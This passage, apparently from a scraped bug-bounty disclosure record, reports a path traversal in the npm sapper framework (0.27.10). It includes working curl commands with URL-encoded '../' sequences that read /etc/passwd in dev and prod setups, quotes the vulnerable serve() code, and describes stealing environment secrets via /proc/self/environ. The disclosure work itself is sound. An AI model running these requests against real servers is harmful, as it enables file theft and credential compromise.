Read the guide or the introductory blog post to learn more.\n\n## Module Stats\n\n[6,762] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe vulnerability was found by playing with a sapper / webpack stack while researching vulnerabilities on internal projects. \nI started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code.\n\n## Steps To Reproduce:\n\n1. Clone https://github.com/sveltejs/sapper-template project\n2. `npm i`\n3. Use `degit` to obtain the webpack example app: `npx degit \"sveltejs/sapper-template#webpack\" my-app`\n4. `npx sapper dev` - **exploit** with `curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`\nThis also works in prod mode with\n4. `npx sapper build \u0026\u0026 node __sapper__build` - **exploit** with `curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`\n \nThe reason why the production deployment requires an extra-layer of URL encoding is because this project runs under polka in production, which, contrary to express for example, applies an extra `decodeURIComponent` on the URI.\n\n## Patch\n\nSapper server simply forms a path with `path.resolve` using the `build_dir` as base directory and the URI-decoded `file` passed in the URL, resulting in a path traversal. \nI am not providing a patch here, but here I've identified the vulnerable code:\n\nsapper/runtime/server.mjs\n------------\n\n```\nfunction serve({ prefix, pathname, cache_control }\n\n\n\n) {\n  const filter = pathname\n    ? (req) =\u003e req.path === pathname\n    : (req) =\u003e req.path.startsWith(prefix);\n\n  const cache = new Map();\n\n  const read = dev\n    ? (file) =\u003e fs.readFileSync(path.resolve(build_dir, file))\n    : (file) =\u003e (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.resolve(build_dir, file)))).get(file);\n\n  return (req, res, next) =\u003e {\n    if (filter(req)) {\n    const type = lookup(req.path);\n\n    try {\n      const file = decodeURIComponent(req.path.slice(1));\n      const data = read(file);\n\n      res.setHeader('Content-Type', type);\n      res.setHeader('Cache-Control', cache_control);\n      res.end(data);\n```\n\n## Supporting Material/References:\n\n- OS: Debian Linux sid\n- NodeJS: v10.19.0\n- NPM: 6.13.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N - I think this is too severe and impacts too many sites to make it public. \n\n![geat success](https://media.makeameme.org/created/very-nice-great-j9n9bg.jpg)\n\n## Impact\n\nAny file can be retrieved from the remote server, namely stuff like /proc/self/environ, which would contain any sort of API keys used by the environment the application has been deployed too. This will lead to complete infrastructure RCE and takeover.","vulnerability_information_html":"\u003cp\u003eI would like to report a critical path traversal vunerability in the sapper module\u003cbr\u003e\nIt allows an attacker to simply obain arbitrary files from the remote server, exploiting a simple path traversal using URL-encoded \u0026quot;../\u0026quot;.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e sapper\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.27.10\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/sapper\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eSapper is a framework for building high-performance universal web apps.
